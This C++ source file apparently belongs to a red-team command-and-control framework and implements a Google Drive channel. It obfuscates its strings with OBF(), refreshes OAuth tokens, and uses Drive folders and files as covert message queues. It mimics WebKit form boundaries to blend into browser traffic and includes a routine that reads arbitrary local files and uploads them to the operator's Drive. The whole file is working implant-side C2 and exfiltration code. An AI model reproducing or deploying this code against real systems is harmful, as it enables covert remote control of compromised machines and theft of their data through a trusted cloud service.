#include "stdafx.h"
#include "GoogleDriveApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"
#include <random>
#include <cctype>
#include <algorithm>
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace
{
	std::wstring ToWideString(std::string const& str)
	{
		return Convert<Utf16>(str);
	}
}

FSecure::GoogleDrive::GoogleDrive(std::string const& userAgent, std::string const& client_id, std::string const& client_secret, std::string const& refresh_token, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	this->m_clientId = client_id;
	this->m_clientSecret = client_secret;
	this->m_refreshToken = refresh_token;
	this->m_UserAgent = userAgent;
	RefreshAccessToken();
	SetChannel(CreateChannel(Convert<Lowercase>(channelName)));
}

void FSecure::GoogleDrive::SetChannel(std::string const& channelId)
{
	this->m_Channel = channelId;
}


void FSecure::GoogleDrive::RefreshAccessToken()
{
	std::string url = OBF_STR("https://oauth2.googleapis.com/token");
	HttpClient webClient(ToWideString(url), m_ProxyConfig);
	
	std::string toSend = OBF("client_id=") + this->m_clientId;
	toSend += OBF("&client_secret=") + this->m_clientSecret;
	toSend += OBF("&refresh_token=") + this->m_refreshToken;
	toSend += OBF("&grant_type=refresh_token");
	toSend += OBF("&access_type=offline");
	std::vector<uint8_t> body = { toSend.begin(), toSend.end() };
	
	auto resp = webClient.Request(CreateHttpRequest(Method::POST, url, GetContentType(ContentType::ApplicationXWwwFormUrlencoded), body, false));

	if (resp.GetStatusCode() != StatusCode::OK)
		throw std::runtime_error(OBF("[x] Failed to retrieve access token.\n"));	
	
	SetToken(json::parse(resp.GetData())[OBF("access_token")]);
}

void FSecure::GoogleDrive::SetToken(std::string const& token)
{
	this->m_accessToken = token;
}

void FSecure::GoogleDrive::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename)
{
	std::string url = OBF_STR("https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart");

	std::string filename;

	if (providedFilename.empty())
	{
		///Create a filename thats prefixed with message direction and suffixed 
		// with more granular timestamp for querying later
		std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
	}
	else
		filename = providedFilename;

	json j;
	j[OBF("name")] = filename;
	j[OBF("mimeType")] = OBF("application/octet-stream");
	j[OBF("parents")] = { this->m_Channel };

	// Generating body
	std::string boundary = OBF("------WebKitFormBoundary") + Utils::GenerateRandomString(16); // Mimicking WebKit, generate random boundary string

	// Building the multipart body (prefix + attachment + suffix)
	std::vector<uint8_t> body;
	std::string bodyPrefix = OBF("\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Type: application/json; charset=UTF-8\r\n\r\n");
	bodyPrefix += j.dump();
	bodyPrefix += OBF("\r\n\r\n");
	bodyPrefix += OBF("--") + boundary + OBF("\r\n");
	bodyPrefix += OBF("Content-Disposition: form-data; name=\"") + filename + OBF("\"") + OBF("\r\n");
	bodyPrefix += OBF("Content-Type: application/octet-stream\r\n\r\n");

	body.insert(body.begin(), bodyPrefix.begin(), bodyPrefix.end()); // Insert the prefix
	body.insert(body.end(), data.begin(), data.end()); // Insert the attachment content
	std::string bodySuffix = OBF("\r\n");
	bodySuffix += OBF("--") + boundary + OBF("--") + OBF("\r\n");
	body.insert(body.end(), bodySuffix.begin(), bodySuffix.end()); // Insert the suffix

	std::string contentType = OBF("multipart/form-data; boundary=") + boundary;

	SendHttpRequest(Method::POST, url, ToWideString(contentType), body);
}

void FSecure::GoogleDrive::UploadFile(std::string const& path)
{
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

void FSecure::GoogleDrive::DeleteAllFiles()
{
	DeleteFile(this->m_Channel);
}

std::map<std::string, std::string> FSecure::GoogleDrive::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = OBF("https://www.googleapis.com/drive/v3/files?q=mimeType%20%3D%20%27application%2Fvnd.google-apps.folder%27");
		
	json response = json::parse(SendHttpRequest(Method::GET, url));
	
	for (auto& channel : response[OBF("files")])
	{
		std::string item_type = channel[OBF("mimeType")];
		if (item_type == OBF("application/vnd.google-apps.folder"))
			channelMap.emplace(channel[OBF("name")], channel[OBF("id")]);
	}
	return channelMap;
}

std::string FSecure::GoogleDrive::CreateChannel(std::string const& channelName)
{
	std::map<std::string, std::string> channels = this->ListChannels();

	if (channels.find(channelName) == channels.end())
	{
		std::string url = OBF("https://www.googleapis.com/drive/v3/files");

		json j;
		j[OBF("name")] = channelName;
		j[OBF("mimeType")] = OBF("application/vnd.google-apps.folder");

		json response = SendJsonRequest(Method::POST, url, j);
		
		std::string channelCreated = response[OBF("name")];
		if (channelCreated != channelName)
			throw std::runtime_error(OBF("Throwing exception: unable to create channel\n"));
		else
			return response[OBF("id")];
	}
	return channels[channelName];
}

std::map<std::string, std::string> FSecure::GoogleDrive::GetMessagesByDirection(std::string const& direction)
{
	std::map<std::string, std::string> messages;
	json response;
	std::string cursor;

	std::string url = OBF("https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20contains%20%27") + direction + OBF("%27&fields=files(id,mimeType,name,parents,createdTime)");
	response = json::parse(SendHttpRequest(Method::GET, url));
	
	for (auto& match : response[OBF("files")])
	{
		messages.insert({ match[OBF("createdTime")].get<std::string>(), match[OBF("id")].get<std::string>() });
	}

	return messages;
}

FSecure::ByteVector FSecure::GoogleDrive::ReadFile(std::string const& id)
{
	std::string url = OBF_STR("https://www.googleapis.com/drive/v3/files/") + id + OBF("?alt=media");
	return SendHttpRequest(Method::GET, url);
}

void FSecure::GoogleDrive::DeleteFile(std::string const& id)
{
	std::string url = OBF("https://www.googleapis.com/drive/v3/files/") + id;
	SendHttpRequest(Method::DEL, url);
}

FSecure::ByteVector FSecure::GoogleDrive::SendHttpRequest(FSecure::WinHttp::Method method, std::string const& host, std::wstring const& contentType, std::vector<uint8_t> data, bool setAuthorizationHeader)
{
	HttpClient webClient(ToWideString(host), m_ProxyConfig);
	
	while (true)
	{
		HttpRequest request = CreateHttpRequest(method, host, contentType, data, setAuthorizationHeader);
		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK)
			return resp.GetData();
		else if (resp.GetStatusCode() == StatusCode::NoContent)
			return {};
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests)
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		else if (resp.GetStatusCode() == StatusCode::Unauthorized)
			RefreshAccessToken();
		else
			throw std::runtime_error(OBF("[x] Non 200/429 HTTP Response\n"));
	}
}

FSecure::WinHttp::HttpRequest FSecure::GoogleDrive::CreateHttpRequest(FSecure::WinHttp::Method method, std::string const& host, std::wstring const& contentType, std::vector<uint8_t> data, bool setAuthorizationHeader)
{
	HttpRequest request; // default request is GET
	request.m_Method = method;
	request.SetTimeout({}, {}, 0ms, 0ms);

	if (!contentType.empty() && !data.empty())
	{
		request.SetData(contentType, data);
	}

	if (setAuthorizationHeader)
		request.SetHeader(Header::Authorization, OBF(L"Bearer ") + ToWideString(this->m_accessToken));
	
	request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

	return request;
}

json FSecure::GoogleDrive::SendJsonRequest(FSecure::WinHttp::Method method, std::string const& url, json const& data)
{
	std::string jsonDump = data.dump();
	return json::parse(SendHttpRequest(method, url, GetContentType(ContentType::ApplicationJson), { jsonDump.begin(), jsonDump.end() }));
}
